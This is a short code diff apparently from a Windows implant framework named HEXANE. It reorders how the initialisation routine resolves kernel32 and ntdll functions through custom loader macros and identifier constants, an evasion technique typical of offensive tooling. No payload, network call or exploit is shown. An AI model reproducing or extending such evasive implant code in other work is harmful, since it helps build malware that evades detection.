@@ -47,7 +47,6 @@ namespace Core {
 
         HEXANE
         PARSER Parser               = { };
-        ULONG Kernel32              = { };
         OSVERSIONINFOW OSVersionW   = { };
 
         Parser::CreateParser(&Parser, Strings, sizeof(Strings));
@@ -57,10 +56,9 @@ namespace Core {
 
         x_memset(Strings, 0, sizeof(Strings));
 
-        /*
-         ntdll.dll
-
-         */
+        if (!(Ctx->Modules.kernel32 = Memory::LdrGetModuleAddress(KERNEL32))) {
+            return_defer(ERROR_PROC_NOT_FOUND);
+        }
         if (!(FPTR2(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
@@ -97,15 +95,6 @@ namespace Core {
             }
         }
 
-        if (Ctx->Session.OSVersion >= WIN_VERSION_2016_X) {
-            Kernel32 = (KERNEL10);
-        } else {
-            Kernel32 = (KERNEL7);
-        }
-
-        if (!(Ctx->Modules.kernel32 = Memory::LdrGetModuleAddress(Kernel32))) {
-            return_defer(ERROR_PROC_NOT_FOUND);
-        }
         if(
             !(FPTR(Ctx->win32.GetLastError, Ctx->Modules.kernel32, GETLASTERROR)) ||
             !(FPTR(Ctx->win32.IsWow64Process, Ctx->Modules.kernel32, ISWOW64PROCESS)) ||
